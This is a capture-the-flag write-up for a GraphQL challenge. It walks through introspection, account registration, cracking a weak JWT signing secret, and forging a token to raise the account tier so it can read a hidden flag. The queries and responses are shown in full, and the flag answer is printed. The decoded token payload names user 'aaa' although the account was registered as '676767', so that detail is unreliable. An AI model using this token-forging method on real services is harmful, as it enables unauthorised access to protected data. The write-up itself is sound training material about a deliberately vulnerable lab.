# ICEMAN

## Description

Drake's label OVO is days away from dropping ICEMAN — his most guarded project yet. They run a private API for members on the early-access list. You managed to snag a fan account. The vault is locked down tight... or is it?

## Solution Walkthrough

Upon entering the website, you are directed to `/graphql`. The frontend provides a GraphQL console where you can input a JWT at the top.

Initially, performing an introspection on GraphQL reveals that the schema contains `Query` and `Mutation`. Among them, `Mutation` provides `register(username, password)` and `login(username, password)`, both of which return an `AuthPayload`. Since the `AuthPayload` includes a `token` field, we can first register a fan account to obtain a JWT.

```text
{
  __type(name: "Mutation") {
    fields {
      name
      args {
        name
        type { kind name ofType { kind name } }
      }
      type { kind name ofType { kind name } }
    }
  }
}
```

```json
{
  "data": {
    "__type": {
      "fields": [
        {
          "args": [
            {
              "name": "username",
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String"
                }
              }
            },
            {
              "name": "password",
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String"
                }
              }
            }
          ],
          "name": "register",
          "type": {
            "kind": "OBJECT",
            "name": "AuthPayload",
            "ofType": null
          }
        },
        {
          "args": [
            {
              "name": "username",
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String"
                }
              }
            },
            {
              "name": "password",
              "type": {
                "kind": "NON_NULL",
                "name": null,
                "ofType": {
                  "kind": "SCALAR",
                  "name": "String"
                }
              }
            }
          ],
          "name": "login",
          "type": {
            "kind": "OBJECT",
            "name": "AuthPayload",
            "ofType": null
          }
        }
      ]
    }
  }
}
```

Therefore, we can use `register` to create an account:

```text
mutation {
  register(username: "676767", password: "aaa") {
    token
  }
}
```

The JWT token obtained after registration is as follows:

```json
{
  "data": {
    "register": {
      "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjY3Njc2NyIsInRpZXIiOiJmYW4ifQ.AHMnJv4wkfe7rODTLlsx9dXa39t_9xUO0h7R3zbfXFw"
    }
  }
}
```

The decoded JWT payload looks like this:

```json
{
  "username": "aaa",
  "tier": "fan"
}
```

When using this token to query `me` or `label`, the server responds with `OVO membership required. Fan accounts do not have vault access`, indicating insufficient privileges.

With a little bit of intuition, it becomes clear that the `tier` needs to be changed to `ovo`. After cracking the JWT using John the Ripper, the secret is found to be `iceman`.

Once that is done, the `me` query works normally:

```text
{
  me {
    username
    tier
  }
}
```

```json
{
  "data": {
    "me": {
      "tier": "ovo",
      "username": "aaa"
    }
  }
}
```

Afterward, we can query the unreleased albums:

```text
{
  label(name: "OVO") {
    name
    artists {
      name
      albums {
        id
        title
        status
        vaultManifest
      }
    }
  }
}
```

```json
{
  "data": {
    "label": {
      "artists": [
        {
          "albums": [
            {
              "id": "1",
              "status": "RELEASED",
              "title": "For All the Dogs",
              "vaultManifest": null
            },
            {
              "id": "2",
              "status": "RELEASED",
              "title": "Some Sexy Songs 4 U",
              "vaultManifest": null
            },
            {
              "id": "9",
              "status": "UNRELEASED",
              "title": "ICEMAN",
              "vaultManifest": "dalctf2026{open-ticket-send-me-ur-fav-song-in-album6}"
            }
          ],
          "name": "Drake"
        }
      ],
      "name": "OVO"
    }
  }
}
```

## Flag

```text
dalctf2026{open-ticket-send-me-ur-fav-song-in-album6}
```
